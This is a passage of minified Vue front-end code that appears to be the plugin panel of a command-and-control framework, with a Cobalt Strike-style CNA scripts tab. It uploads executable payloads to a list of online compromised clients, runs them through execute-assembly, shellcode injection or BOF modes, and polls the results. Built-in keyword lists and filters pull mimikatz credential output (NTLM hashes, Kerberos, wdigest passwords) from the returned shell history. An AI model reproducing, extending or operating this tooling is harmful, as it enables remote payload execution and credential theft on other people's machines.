const __vite__mapDeps=(i,m=__vite__mapDeps,d=(m.f||(m.f=["js/ScriptManagerPanel.D14eNMBF.js","js/index.BMFFlgJv.js","js/vue.Z7l_21JU.js","js/element.D0uqLaG8.js","js/utils.NIGUFBhG.js","css/index.BKthuhbg.css","css/ScriptManagerPanel.Do3ZQLld.css","css/el-select.DYD98qvO.css"])))=>i.map(i=>d[i]);
import{s as Y,u as xe,_ as $e,C as me,i as Ye}from"./index.BMFFlgJv.js";/* empty css                     *//* empty css                        *//* empty css                 *//* empty css                  */import{a as F,y as Ce,C as H,D as y,i as u,L as C,I,u as s,J as r,f as O,G as Z,h as S,K as te,ac as de,aj as ke,ak as Pe,ar as Ze,e as ve,d as qe,O as Je,F as ge,E as Qe,S as et,ad as tt}from"./vue.Z7l_21JU.js";import{d as lt,W as nt,R as Ue,k as at,i as v,P as ot,r as st,t as it,Q as ut,X as rt,u as ct,Y as dt,V as pt,j as ht}from"./element.D0uqLaG8.js";import{T as ft}from"./index.CBEocMjX.js";/* empty css                                                                   */import"./utils.NIGUFBhG.js";const Ee=["execute-assembly","inline-bin","shellcode-inject","script","binary","bof","exec-file"],mt=["Authentication Id","Session","Username","Domain","NTLM","SHA1","Password","Kerberos","Primary","msv","tspkg","wdigest","kerberos","ssp","credman","=== CAPTURED OUTPUT ===","=== FINAL OUTPUT DUMP ==="],vt=["Authentication Id","Session","Username","Domain","NTLM","SHA1","mimikatz","=== CAPTURED OUTPUT ==="];function ie(n){return n.startsWith("$ ")}function Se(n,i,l){for(let c=n.length-1;c>=0;c--){const t=n[c];if(ie(t)&&t.includes(i)&&t.includes(l))return c}return-1}function Le(n,i){const l=n.toLowerCase();return i.some(c=>l.includes(c.toLowerCase()))}function _e(n,i,l,c){if(!n||!i)return n;const t=c.log??(()=>{}),o=n.split(`
`),m=Se(o,i,l);if(m===-1)return c.noOutputHint;let k=o.length;for(let f=m+1;f<o.length;f++){const b=o[f];if(ie(b)&&Ee.some(U=>b.includes(U))){k=f;break}}const w=o.slice(m,k);let z=w.join(`
`);if(z.length<500&&l.toLowerCase().includes("mimikatz")){t("🔍 检测到 mimikatz，扩展输出范围以包含更多内容");const f=Math.max(0,m-50),b=o.slice(f,k);Le(b.join(`
`),mt)&&(t("🎯 发现凭据相关内容，使用扩展范围"),z=b.join(`
`))}return t("🔍 最新执行内容过滤结果:",{原始总行数:o.length,最后命令位置:m,结束位置:k,提取行数:w.length,最终内容长度:z.length,执行模式:i,插件名:l}),z}function ye(n,i,l,c){if(!n||!i)return n;const t=c.log??(()=>{}),o=n.split(`
`);let m=Se(o,i,l);if(m===-1)for(let f=o.length-1;f>=0;f--){const b=o[f],U=b.toLowerCase();if(ie(b)&&(U.includes("mimikatz")||U.includes("sekur")||b.includes(l))){m=f;break}}if(m===-1){const b=o.slice(Math.max(0,o.length-200)).join(`
`);return Le(b,vt)?(t("🎯 在最近内容中发现可能的 mimikatz 输出"),b):c.noOutputHint}let k=o.length;for(let f=m+1;f<o.length;f++){const b=o[f];if(ie(b)&&!b.includes("[CLIENT-PACKET]")&&!b.includes("完整数据包")&&Ee.some(U=>b.includes(U))&&!b.includes(l)){k=f;break}}const w=Math.max(0,m-20),z=o.slice(w,k);return t("🔍 Mimikatz 专用过滤结果:",{原始总行数:o.length,开始位置:w,最后命令位置:m,结束位置:k,提取行数:z.length,执行模式:i,插件名:l}),z.join(`
`)}function gt(n,i){switch(n){case"execute-assembly":return"Execute Assembly";case"inline-bin":return"Inline Bin";case"shellcode-inject":return i?"Shellcode注入":"Shellcode";case"script":return"Linux Script";case"binary":return"Linux Binary";case"bof":return"BOF(COFF)";case"exec-file":return"Exec File";default:return i?"请选择模式":"Select Mode"}}const _t=400,yt=200;function bt(n){return Math.max(_t,Math.round(n))}function wt(n){return Math.max(yt,Math.round(n))}function xt(n,i,l){const c={width:l.width,height:l.height};return(n==="both"||n==="width")&&(c.width=i?Math.round(i.width):l.width),(n==="both"||n==="height")&&(c.height=i?Math.round(i.height):l.height),c}function $t(n,i,l,c,t){const o={width:l.width,height:l.height};return(n==="both"||n==="width")&&(o.width=bt(i.width+c)),(n==="both"||n==="height")&&(o.height=wt(i.height+t)),o}function Ct(n={}){const i=F(n.initialWidth??800),l=F(n.initialHeight??400),c=F(!1),t=F(""),o=F(!1);let m=0,k=0,w={width:i.value,height:l.value};function z(U,L,D,B){c.value=!0,t.value=U,m=L,k=D,w=xt(U,B,{width:i.value,height:l.value}),i.value=w.width,l.value=w.height,o.value=!0}function f(U,L){if(!c.value||!t.value)return;const D=$t(t.value,w,{width:i.value,height:l.value},U-m,L-k);i.value=D.width,l.value=D.height}function b(){c.value=!1,t.value=""}return{width:i,height:l,isResizing:c,kind:t,userResized:o,start:z,move:f,end:b}}const G={get_online_clients(){return Y({url:"/client/online-clients",method:"get"})},get_plugins(){return Y({url:"/plugin/list",method:"get"})},get_plugin_details(n){return Y({url:`/plugin/details/${n}`,method:"get"})},upload_plugin(n){const i=new FormData;return i.append("plugin",n),Y({url:"/plugin/upload",method:"post",data:i})},download_plugin(n){return Y({url:`/plugin/download/${encodeURIComponent(n)}`,method:"get",responseType:"blob"})},delete_plugin(n){return Y({url:`/plugin/delete/${encodeURIComponent(n)}`,method:"delete"})},get_shell_history(n){return Y({url:`/client/shell/history/${n}`,method:"get"})}},be=["B","KB","MB","GB"];function Te(n){if(!Number.isFinite(n)||n<=0)return"0 B";const i=1024,l=Math.min(Math.floor(Math.log(n)/Math.log(i)),be.length-1);return parseFloat((n/Math.pow(i,l)).toFixed(2))+" "+be[l]}const kt=n=>(ke("data-v-ff53ff75"),n=n(),Pe(),n),Pt={class:"upload-dialog-content"},Ut={class:"upload-info-banner"},Et={class:"file-list-area"},St={class:"file-list-header"},Lt={class:"header-col thumbnail"},Tt={class:"header-col filename"},It={class:"header-col filesize"},Dt={class:"header-col status"},Mt={class:"header-col operation"},Rt={class:"file-list-body"},Ft={key:0,class:"empty-file-list"},At=kt(()=>u("div",{class:"file-col thumbnail"},[u("div",{class:"file-icon"},"📄")],-1)),zt={class:"file-col filename"},Ot={class:"file-col filesize"},Bt={class:"file-col status"},Nt={class:"file-col operation"},jt={class:"upload-dialog-footer"},oe=6,Wt=Ce({__name:"PluginUploadDialog",props:{visible:{type:Boolean}},emits:["update:visible","uploaded"],setup(n,{expose:i,emit:l}){const c=xe(),t={get value(){return c.isZh}},o=F([]),m=F(),k=L=>{const D=["application/x-msdownload","application/x-executable","application/x-sharedlib","application/x-so","application/x-python","text/x-python","application/octet-stream"],B=[".exe",".net",".elf",".dll",".so",".dylib",".bin",".sh",".py",".ps1",".o",".obj",".coff"],P=L.name.toLowerCase(),E=B.some(j=>P.endsWith(j));return!D.includes(L.type)&&!E?(v.warning(t.value?"只能上传插件文件(可执行载荷或脚本，如 exe/dll/so/bin/sh)":"Only plugin files allowed (executable payloads or scripts, e.g. exe/dll/so/bin/sh)"),!1):L.size>50*1024*1024?(v.warning(t.value?"文件大小不能超过50MB":"File size cannot exceed 50MB"),!1):!0},w=()=>{var L;(L=m.value)==null||L.click()},z=L=>{const D=L.target;if(D.files){const B=Array.from(D.files),P=[];for(const j of B)k(j)&&P.push(j);const E=Math.max(oe-o.value.length,0);P.length>E&&v.warning(t.value?`最多只能同时上传 ${oe} 个文件`:`Up to ${oe} files at a time`),o.value.push(...P.slice(0,E))}D.value=""},f=L=>{o.value.splice(L,1)},b=()=>{l("update:visible",!1),o.value=[]},U=async()=>{var D,B;if(o.value.length===0){v.warning(t.value?"请选择要上传的文件":"Select files to upload");return}let L=0;for(const P of o.value)try{const E=await G.upload_plugin(P);((D=E.data)==null?void 0:D.status)===200?(L++,v.success(t.value?`${P.name} 上传成功`:`${P.name} uploaded`)):v.error(((B=E.data)==null?void 0:B.message)||(t.value?`${P.name} 上传失败`:`${P.name} upload failed`))}catch(E){console.error(`[PLUGIN] 上传失败: ${P.name}`,E),E!=null&&E.response||v.error(t.value?`${P.name} 上传失败: ${(E==null?void 0:E.message)||"未知错误"}`:`${P.name} upload failed: ${(E==null?void 0:E.message)||"unknown error"}`)}L>0&&l("uploaded")};return i({fileList:o,MAX_UPLOAD_FILES:oe,beforeUpload:k}),(L,D)=>{const B=lt,P=Ue,E=at;return S(),H(E,{"model-value":L.visible,title:s(c).tl("上传插件","Upload Plugin"),width:"700px","close-on-click-modal":!1,"onUpdate:modelValue":D[0]||(D[0]=j=>l("update:visible",j))},{footer:y(()=>[u("div",jt,[C(P,{onClick:b},{default:y(()=>[I(r(s(c).tl("关闭","Close")),1)]),_:1}),C(P,{type:"primary",onClick:U},{default:y(()=>[I(r(s(c).tl("开始上传","Start Upload")),1)]),_:1})])]),default:y(()=>[u("div",Pt,[u("div",Ut,[C(B,{class:"info-icon"},{default:y(()=>[C(s(nt))]),_:1}),I(" "+r(s(c).tl("支持exe,net,elf,dll,so,dylib格式，单个文件不超过50MB，最多只能同时上传6个文件","Supports exe, net, elf, dll, so, dylib. Max 50MB per file, up to 6 files at once."))+" ",1),C(P,{type:"primary",class:"select-file-btn",onClick:w},{default:y(()=>[I(r(s(c).tl("选择文件","Select Files")),1)]),_:1})]),u("div",Et,[u("div",St,[u("div",Lt,r(s(c).tl("缩略图","Preview")),1),u("div",Tt,r(s(c).tl("文件名","File Name")),1),u("div",It,r(s(c).tl("文件大小","Size")),1),u("div",Dt,r(s(c).tl("状态","Status")),1),u("div",Mt,r(s(c).tl("操作","Actions")),1)]),u("div",Rt,[o.value.length===0?(S(),O("div",Ft,r(s(c).tl("暂无文件","No files")),1)):Z("",!0),(S(!0),O(te,null,de(o.value,(j,ee)=>(S(),O("div",{key:ee,class:"file-item"},[At,u("div",zt,r(j.name),1),u("div",Ot,r(s(Te)(j.size)),1),u("div",Bt,r(s(c).tl("待上传","Pending")),1),u("div",Nt,[C(P,{type:"text",onClick:le=>f(ee)},{default:y(()=>[I(r(s(c).tl("删除","Remove")),1)]),_:2},1032,["onClick"])])]))),128))])]),u("input",{ref_key:"fileInput",ref:m,type:"file",multiple:"",accept:".exe,.net,.elf,.dll,.so,.dylib",style:{display:"none"},onChange:z},null,544)])]),_:1},8,["model-value","title"])}}}),Vt=$e(Wt,[["__scopeId","data-v-ff53ff75"]]);function ue(n){return n?[/�/,/[À-ÿ][@-ÿ]/,/[-¿][-¿]/].some(l=>l.test(n)):!1}function Ht(n){if(!n)return 0;let i=0,l=0;for(const c of n){const t=c.codePointAt(0);if(!(t<32&&t!==10&&t!==13&&t!==9)){if(t<=127){l++;continue}l++,(t>=19968&&t<=40959||t>=12288&&t<=12351||t>=65280&&t<=65519)&&i++}}return l===0?0:i/l}let se=null;function Gt(n){if(typeof TextDecoder>"u")return null;if(se===null)try{new TextDecoder("gb18030"),se=!0}catch{se=!1}if(!se)return null;const i=new Uint8Array(n.length);for(let l=0;l<n.length;l++){const c=n.charCodeAt(l);if(c>255)return null;i[l]=c}try{const l=new TextDecoder("gb18030",{fatal:!1}).decode(i);return!l||l===n||/�/.test(l)||Ht(l)<.05?null:l}catch{return null}}function Kt(n){if(!n)return n;try{if(n.includes("%"))try{const i=decodeURIComponent(n);if(i!==n&&!ue(i))return i}catch{}if(ue(n)){const i=Gt(n);if(i!==null)return i}return n}catch(i){return console.warn("编码修复失败:",i),n}}function we(n){if(!n||!ue(n))return n;const i=Kt(n);return i!==n&&!ue(i)?i:n}const Xt=n=>(ke("data-v-cb6db264"),n=n(),Pe(),n),Yt={class:"plugin-container cs-font-ui"},Zt={class:"plug-tabs"},qt={class:"plug-toolbar"},Jt={class:"plug-title-group"},Qt={class:"plug-title"},el={class:"plug-count"},tl=Xt(()=>u("div",{class:"plug-spacer"},null,-1)),ll={class:"plugin-card"},nl={class:"execution-mode-buttons"},al={class:"plugin-select-row"},ol={class:"plugin-detail-strip cs-font-ui"},sl={key:0,class:"pd-loading"},il={class:"pd-cell"},ul={class:"pd-label"},rl={class:"pd-value mono"},cl={class:"pd-cell"},dl={class:"pd-label"},pl={class:"pd-value"},hl={class:"pd-cell"},fl={class:"pd-label"},ml={class:"pd-value mono"},vl={class:"pd-cell"},gl={class:"pd-label"},_l={class:"pd-value mono"},yl={class:"pd-cell"},bl={class:"pd-label"},wl={class:"pd-value"},xl={key:2,class:"pd-empty"},$l={class:"output-section"},Cl={class:"output-header"},kl={class:"output-title"},Pl={class:"output-controls"},Ul=["disabled"],El={key:0},Sl={key:1},Ll={class:"output-wrapper"},Tl=Ce({__name:"PluginsView",setup(n){const i=Ze(()=>Ye(()=>import("./ScriptManagerPanel.D14eNMBF.js"),__vite__mapDeps([0,1,2,3,4,5,6,7]))),l=xe(),c=F("plugins"),t=ve(()=>l.isZh),o=F({clientUid:"",selectedPlugin:"",arguments:""}),m=F(""),k=F([]),w=F(null),z=F(!1),f=F(""),b=F([]),U=ve(()=>{if(!o.value.clientUid)return!0;const a=b.value.find(x=>x.Uid===o.value.clientUid);if(!a)return!0;const e=(a.Arch||"").toLowerCase(),p=(a.Computer||"").toLowerCase();return!e.includes("linux")&&!e.includes("darwin")&&!p.includes("linux")}),{width:L,height:D,userResized:B,start:P,move:E,end:j}=Ct(),ee=F(),le=F(!1);qe(async()=>{await ae(),await Fe(),document.addEventListener("mousemove",pe),document.addEventListener("mouseup",he)}),Je(()=>{document.removeEventListener("mousemove",pe),document.removeEventListener("mouseup",he),A&&(clearInterval(A),A=null)});const re=()=>{const a=ee.value;if(!a)return null;const e=a.getBoundingClientRect();return{width:e.width,height:e.height}},Ie=a=>{a.preventDefault(),P("both",a.clientX,a.clientY,re())},De=a=>{a.preventDefault(),P("width",a.clientX,a.clientY,re())},Me=a=>{a.preventDefault(),P("height",a.clientX,a.clientY,re())},pe=a=>{E(a.clientX,a.clientY)},he=()=>{j()},V=()=>gt(m.value,t.value),ne=a=>({noOutputHint:a==="mimikatz"?t.value?`暂无执行相关输出，请检查执行是否成功。

如果问题持续，请查看完整Shell历史。`:`No execution output found, check whether the run succeeded.

If the problem persists, review the full shell history.`:t.value?`暂无当前执行模式的相关输出。

请执行插件后查看结果。`:`No output for the current execution mode.

Run a plugin and check the result.`,log:(...e)=>console.log(...e)}),K=a=>{m.value=a},Re=a=>{const e=a.Listener||"tcp",p=a.ID||a.id||"N/A",_=(d=>{let g="unknown",N=d.Arch||"unknown";return d.Process&&d.Process.includes(".exe")?g="windows":d.Computer&&d.Computer.toLowerCase().includes("linux")?g="linux":d.Computer&&d.Computer.toLowerCase().includes("darwin")?g="darwin":g="windows",`${g}_${N}`})(a);return t.value?`ID：${p} | ${e.toUpperCase()} | ${a.ExternalIP} | ${_} | ${a.Computer}`:`ID: ${p} | ${e.toUpperCase()} | ${a.ExternalIP} | ${_} | ${a.Computer}`},Fe=async()=>{var a,e;try{const p=await G.get_online_clients();if(p.data&&p.data.status===200&&Array.isArray(p.data.data)){const d=p.data.data.filter(g=>(g.online??g.Online)==="1"||String(g.online??g.Online)==="1").map(g=>({Uid:g.uid||g.Uid||"",Computer:g.computer||g.Computer||"unknown",ExternalIP:g.external_ip||g.ExternalIP||"-",Username:g.username||g.Username||"user",Listener:g.listener||g.Listener||"tcp",Online:"1"}));if(d.length){b.value=d,d.length;return}}const _=((e=(a=(await me.get_clients_list({page:1,page_size:1e3})).data)==null?void 0:a.data)==null?void 0:e.list)||[];b.value=_.filter(d=>d.Online==="1"||String(d.Online)==="1"),b.value.length||console.warn("在线客户端为空")}catch(p){console.error("获取在线客户端失败:",p),v.error(t.value?"获取客户端列表失败":"Failed to load client list")}},ae=async()=>{try{const a=await G.get_plugins();a.data&&a.data.status===200?(k.value=a.data.data||[],k.value.length,k.value.length>0&&k.value.map(e=>e.Name)):(console.error("❌ 插件API返回异常:",a.data),k.value=[],v.error(t.value?"插件列表加载失败":"Failed to load plugin list"))}catch(a){console.error("❌ 刷新插件列表失败:",a),k.value=[],v.error(t.value?"刷新插件列表失败":"Failed to refresh plugin list")}},Ae=async()=>{var e;w.value=null;const a=o.value.selectedPlugin;if(a){z.value=!0;try{const p=await G.get_plugin_details(a);p.data&&p.data.status===200?w.value=p.data.data||null:(w.value=null,v.error(((e=p.data)==null?void 0:e.message)||(t.value?"获取插件详情失败":"Failed to load plugin details")))}catch{w.value=null,v.error(t.value?"获取插件详情失败":"Failed to load plugin details")}finally{z.value=!1}}},ze=async()=>{const a=o.value.selectedPlugin;if(a)try{const e=await G.download_plugin(a),p=e.data instanceof Blob?e.data:new Blob([e.data],{type:"application/octet-stream"}),x=document.createElement("a"),_=URL.createObjectURL(p);x.href=_,x.download=a,x.click(),URL.revokeObjectURL(_),v.success(t.value?`插件 ${a} 已下载`:`Plugin ${a} downloaded`)}catch(e){v.error((e==null?void 0:e.message)||(t.value?"下载插件失败":"Failed to download plugin"))}},Oe=()=>{const a=o.value.selectedPlugin;a&&ht.confirm(t.value?`确定要删除插件 "${a}" 吗？此操作不可恢复。`:`Delete plugin "${a}"? This cannot be undone.`,t.value?"删除插件确认":"Delete Plugin",{confirmButtonText:t.value?"确定":"Confirm",cancelButtonText:t.value?"取消":"Cancel",type:"error"}).then(async()=>{var e,p,x,_;try{const d=await G.delete_plugin(a);d.data&&d.data.status===200?(v.success(t.value?"插件已删除":"Plugin deleted"),o.value.selectedPlugin="",w.value=null,await ae()):v.error(((e=d.data)==null?void 0:e.data)||((p=d.data)==null?void 0:p.message)||(t.value?"删除插件失败":"Failed to delete plugin"))}catch(d){v.error(((_=(x=d.response)==null?void 0:x.data)==null?void 0:_.data)||(t.value?"删除插件失败":"Failed to delete plugin"))}})},Be=()=>{A&&(clearInterval(A),A=null,f.value+=t.value?`

[⏹️] 用户手动停止轮询
提示：您可以稍后手动查看Shell历史记录来确认执行结果`:`

[⏹️] Polling stopped by user
Tip: check the shell history later to confirm the result`,v.info(t.value?"已停止轮询获取执行结果":"Stopped polling for results"))},Ne=()=>{f.value="",v.success(t.value?"输出已清空":"Output cleared")},je=async()=>{if(!f.value){v.warning(t.value?"没有内容可复制":"Nothing to copy");return}try{await navigator.clipboard.writeText(f.value),v.success(t.value?"已复制全部输出内容":"Copied all output")}catch{const e=document.createElement("textarea");e.value=f.value,document.body.appendChild(e),e.select(),document.execCommand("copy"),document.body.removeChild(e),v.success(t.value?"已复制全部输出内容":"Copied all output")}},We=()=>{if(!f.value){v.warning(t.value?"没有内容可导出":"Nothing to export");return}const a=new Date().toISOString().replace(/[:.]/g,"-"),p=`plugin-output-${o.value.selectedPlugin||"unknown"}-${a}.txt`,x=new Blob([f.value],{type:"text/plain;charset=utf-8"}),_=URL.createObjectURL(x),d=document.createElement("a");d.href=_,d.download=p,document.body.appendChild(d),d.click(),document.body.removeChild(d),URL.revokeObjectURL(_),v.success(t.value?"日志已导出":"Log exported")},Ve=async()=>{if(!o.value.clientUid){v.warning(t.value?"请先选择客户端":"Select a client first");return}try{const a=await G.get_shell_history(o.value.clientUid);if(a.data&&a.data.status===200){const e=we(a.data.data||"");e.length,e.split(`
`).length,e.toLowerCase().includes("mimikatz"),e.includes("Authentication Id"),e.includes("=== CAPTURED OUTPUT ==="),e.includes("=== FINAL OUTPUT DUMP ===");const p=o.value.selectedPlugin.toLowerCase().includes("mimikatz")||o.value.selectedPlugin.toLowerCase().includes("sekur")||o.value.selectedPlugin.toLowerCase().includes("creds");let x=e;m.value&&o.value.selectedPlugin&&(p?x=ye(e,m.value,o.value.selectedPlugin,ne("mimikatz")):x=_e(e,m.value,o.value.selectedPlugin,ne("mode")));const _=W=>W?t.value?"是":"yes":t.value?"否":"no",d=p?t.value?"Mimikatz专用模式（宽松过滤）":"Mimikatz mode (loose filter)":t.value?"标准过滤模式":"Standard filter",g=m.value?t.value?`显示模式: ${d}`:`Display mode: ${d}`:"",N=e.includes("Authentication Id"),M=e.includes("=== CAPTURED OUTPUT ===")||e.includes("=== FINAL OUTPUT DUMP ===");f.value=t.value?`[🔄] 手动刷新Shell历史
时间: ${new Date().toLocaleString()}
客户端: ${o.value.clientUid}
${g}

=== 调试信息 ===
原始内容长度: ${e.length} 字符
过滤后长度: ${x.length} 字符
包含 mimikatz 关键字: ${_(e.toLowerCase().includes("mimikatz"))}
包含凭据信息: ${_(N)}
包含输出标记: ${_(M)}

=== 最新执行结果 ===
${x}

=== 调试提示 ===
如果上面的结果不完整，请检查：
1. 客户端日志是否显示完整输出
2. 是否选择了正确的执行模式
3. 插件名称是否匹配`:`[🔄] Shell History Refreshed
Time: ${new Date().toLocaleString()}
Client: ${o.value.clientUid}
${g}

=== Debug Info ===
Raw length: ${e.length} chars
Filtered length: ${x.length} chars
Contains mimikatz keyword: ${_(e.toLowerCase().includes("mimikatz"))}
Contains credential info: ${_(N)}
Contains output markers: ${_(M)}

=== Latest Execution Result ===
${x}

=== Debug Tips ===
If the result above is incomplete, check:
1. Whether the client log shows the complete output
2. Whether the correct execution mode is selected
3. Whether the plugin name matches`,v.success(t.value?"已更新Shell历史内容（包含调试信息）":"Shell history updated (with debug info)")}else v.error(t.value?"获取Shell历史失败":"Failed to load shell history")}catch(a){console.error("刷新Shell内容失败:",a),v.error(t.value?"刷新失败："+(a instanceof Error?a.message:"网络错误"):"Refresh failed: "+(a instanceof Error?a.message:"network error"))}},He=async()=>{if(!o.value.clientUid||!o.value.selectedPlugin||!m.value){v.warning(t.value?"请选择客户端、插件和执行模式":"Select a client, plugin and execution mode");return}const a=b.value.find(e=>e.Uid===o.value.clientUid);if(!a||a.Online!=="1"){v.error(t.value?"所选客户端不在线，请选择其他客户端":"Selected client is offline, pick another one");return}try{const e=o.value.selectedPlugin,p=o.value.clientUid,x=o.value.arguments||"",_=x||(t.value?"无":"none");f.value=t.value?`[🔄] 开始执行插件
===================
模式: ${V()}
插件: ${e}
参数: ${_}
客户端: ${a.Computer} (${a.ExternalIP})
执行时间: ${new Date().toLocaleTimeString()}
显示模式: 仅显示最新一次 ${m.value} 执行结果
===================

正在下载插件文件...`:`[🔄] Plugin Execution Started
===================
Mode: ${V()}
Plugin: ${e}
Arguments: ${_}
Client: ${a.Computer} (${a.ExternalIP})
Started at: ${new Date().toLocaleTimeString()}
Display mode: latest ${m.value} run only
===================

Downloading plugin file...`,f.value+=t.value?`
正在准备执行文件...`:`
Preparing execution file...`;const d=await G.download_plugin(e),g=d.data instanceof Blob?d.data:new Blob([d.data],{type:"application/octet-stream"}),N=new File([g],e);f.value+=t.value?`
正在发送命令到客户端...`:`
Sending command to client...`;const M=await me.execute_bin(p,N,x,m.value),W=M==null?void 0:M.data;if(W.status===200){f.value+=t.value?`
命令已成功发送到客户端

正在等待执行结果...`:`
Command sent to client

Waiting for results...`,v.success(t.value?"插件命令已发送，正在等待执行结果":"Command sent, waiting for results");const h=Number(W.task_id)||0;h||console.warn("未取得任务 ID，回退到输出稳定性判定（任务中心将看不到本次执行）"),Ge(p,e,h)}else{const h=W.data||W.message||(t.value?"未知错误":"Unknown error");f.value=t.value?`[✗] 执行失败
错误原因: ${h}

请检查：
1. 客户端是否正常连接
2. 插件文件格式是否正确
3. 执行模式是否与插件类型匹配`:`[✗] Execution Failed
Reason: ${h}

Check:
1. Whether the client is connected
2. Whether the plugin file format is correct
3. Whether the execution mode matches the plugin type`,v.error((t.value?"插件执行失败: ":"Plugin execution failed: ")+h)}}catch(e){let p=t.value?"未知错误":"Unknown error";e instanceof Error?p=e.message:typeof e=="string"&&(p=e),f.value=t.value?`[✗] 执行失败
错误信息: ${p}

常见问题解决：
1. 检查网络连接是否正常
2. 确认身份验证未过期
3. 刷新页面后重试
4. 联系管理员获取帮助`:`[✗] Execution Failed
Error: ${p}

Common fixes:
1. Check the network connection
2. Make sure the session has not expired
3. Refresh the page and retry
4. Contact an administrator`,v.error((t.value?"执行插件时发生错误: ":"Plugin execution error: ")+p),console.error("执行插件时发生错误:",e)}};let A=null;const Ge=(a,e,p)=>{A&&(clearInterval(A),A=null);const x=Date.now(),_=10*60*1e3,d=1e3,g=e.toLowerCase().includes("mimikatz")||e.toLowerCase().includes("sekur")||e.toLowerCase().includes("creds");let N=!1,M="",W="",h="",ce=0;const fe=async()=>{const T=await G.get_shell_history(a);if(!(T.data&&T.data.status===200))return h;const $=we(T.data.data||""),R=g?ye($,m.value,e,ne("mimikatz")):_e($,m.value,e,ne("mode"));return h=R,R},q=()=>{const T=b.value.find($=>$.Uid===a);return T&&(T.Computer||T.ExternalIP)||a.slice(0,8)},J=()=>Math.round((Date.now()-x)/1e3),Ke=()=>{A&&(clearInterval(A),A=null)},X=(T,$)=>{const R=t.value?`[${$.ok?"✓":"✗"}] ${$.title||($.ok?"插件执行完成":"插件执行未成功")}
模式: ${V()}
插件: ${e}
参数: ${o.value.arguments||"无"}
客户端: ${q()}
执行时间: ${J()}秒
显示模式: ${g?"完整输出模式（mimikatz优化）":"过滤输出模式"}`:`[${$.ok?"✓":"✗"}] ${$.title||($.ok?"Plugin finished":"Plugin did not finish")}
Mode: ${V()}
Plugin: ${e}
Arguments: ${o.value.arguments||"none"}
Client: ${q()}
Elapsed: ${J()}s
Display mode: ${g?"full output (mimikatz tuned)":"filtered output"}`,Q=T&&T.trim().length>0?t.value?`

=== 最终执行结果 ===
${T}`:`

=== Final Execution Result ===
${T}`:t.value?`

（该任务没有回显内容）`:`

(no output recorded for this task)`;f.value=R+Q+($.note?`

${$.note}`:""),Ke(),$.ok?v.success(t.value?"插件执行完成，完整结果已显示":"Plugin finished, full results shown"):v.error($.note||(t.value?"插件执行未成功":"Plugin did not finish"))},Xe=async()=>{let T=h;for(let $=0;$<3;$++){await new Promise(R=>setTimeout(R,700));try{const R=await fe();if(R.length>T.length&&(T=R),T.trim().length>0&&$>=1)break}catch{}}return T};A=setInterval(async()=>{var T;if(!N){N=!0;try{if(p)try{const Q=(T=(await ft.get(p)).data)==null?void 0:T.data;Q&&Q.status&&(M=Q.status,W=Q.error||"")}catch{}let $=h;try{$=await fe()}catch(R){console.error("获取Shell历史失败:",R)}if(M&&M!=="dispatched"){const R=await Xe();M==="completed"?X(R,{ok:!0}):M==="failed"?X(R,{ok:!1,title:t.value?"插件执行失败":"Plugin execution failed",note:(t.value?"失败原因: ":"Reason: ")+(W||(t.value?"未知（目标未回执）":"unknown"))}):M==="cancelled"?X(R,{ok:!1,title:t.value?"任务已取消":"Task cancelled",note:t.value?"已停止等待回显（命令无法从目标撤回）":"Stopped waiting for output (command cannot be retracted)"}):M==="timeout"?X(R,{ok:!1,title:t.value?"任务超时":"Task timed out",note:t.value?"服务端判定目标长时间未回执，可能已离线":"Target did not respond in time; it may be offline"}):X(R,{ok:!1,title:t.value?`任务状态: ${M}`:`Task status: ${M}`});return}if($.trim().length>0?(f.value=t.value?`[⏳] 插件正在执行...
模式: ${V()}
插件: ${e}
参数: ${o.value.arguments||"无"}
客户端: ${q()}
已等待: ${J()}秒${p?"":"（未取得任务状态，按输出稳定性判断）"}

=== 实时执行结果 ===
${$}`:`[⏳] Plugin running...
Mode: ${V()}
Plugin: ${e}
Arguments: ${o.value.arguments||"none"}
Client: ${q()}
Elapsed: ${J()}s${p?"":" (no task status; judging by output stability)"}

=== Live Execution Result ===
${$}`,$===h?ce++:ce=0):f.value=t.value?`[⏳] 已下发，等待目标回显...
模式: ${V()}
插件: ${e}
客户端: ${q()}
已等待: ${J()}秒

提示：目标为轮询型客户端时，需要等它下一次回连才会取到命令。`:`[⏳] Dispatched, waiting for target output...
Mode: ${V()}
Plugin: ${e}
Client: ${q()}
Elapsed: ${J()}s

Note: polling transports fetch commands on their next check-in.`,!p&&ce>=3&&$.trim().length>10){X($,{ok:!0,title:t.value?"插件执行完成（按输出稳定性判断）":"Plugin finished (judged by output stability)",note:t.value?"未能取得任务状态（数据库不可用？），此处按输出连续稳定判定":"No task status available (DB down?); judged by stable output"});return}Date.now()-x>_&&X(h,{ok:!1,title:t.value?"等待回显超时":"Timed out waiting for output",note:t.value?`已等待 ${Math.round(_/6e4)} 分钟仍未收到回执。任务仍在服务端任务中心（可查状态或取消），目标可能已离线或命令仍在队列中。`:`Waited ${Math.round(_/6e4)} minutes with no response. The task is still listed in the Task Center (check status or cancel); the target may be offline or the command still queued.`})}finally{N=!1}}},d)};return(a,e)=>{const p=it,x=st,_=ot,d=Ue,g=ut,N=ct,M=dt,W=pt;return S(),O("div",Yt,[u("div",Zt,[u("div",{class:ge(["plug-tab",{active:c.value==="plugins"}]),onClick:e[0]||(e[0]=h=>c.value="plugins")},r(s(l).tl("插件运行","Plugins")),3),u("div",{class:ge(["plug-tab",{active:c.value==="scripts"}]),onClick:e[1]||(e[1]=h=>c.value="scripts")},r(s(l).tl("脚本 (CNA)","Scripts (CNA)")),3)]),c.value==="plugins"?(S(),O(te,{key:0},[u("div",qt,[u("div",Jt,[u("span",Qt,r(s(l).tl("内存执行与插件模块","Memory Execution & Plugins")),1),u("span",el,"("+r(k.value.length)+" "+r(s(l).tl("个插件可用","plugins available"))+")",1)]),tl,u("button",{class:"cs-btn cs-btn-primary",onClick:e[2]||(e[2]=h=>le.value=!0)},r(s(l).tl("上传插件","Upload Plugin")),1),u("button",{class:"cs-btn",onClick:ae},r(s(l).tl("刷新","Refresh")),1)]),u("div",ll,[C(W,{model:o.value,"label-width":"120px",class:"plugin-form"},{default:y(()=>[C(_,{label:s(l).tl("选择客户端","Select Client"),required:""},{default:y(()=>[C(x,{modelValue:o.value.clientUid,"onUpdate:modelValue":e[3]||(e[3]=h=>o.value.clientUid=h),placeholder:s(l).tl("请选择已上线的客户端","Select an online client"),class:"full-width"},{default:y(()=>[(S(!0),O(te,null,de(b.value,h=>(S(),H(p,{key:h.Uid,label:Re(h),value:h.Uid},null,8,["label","value"]))),128))]),_:1},8,["modelValue","placeholder"])]),_:1},8,["label"]),C(_,{label:s(l).tl("执行模式","Execution 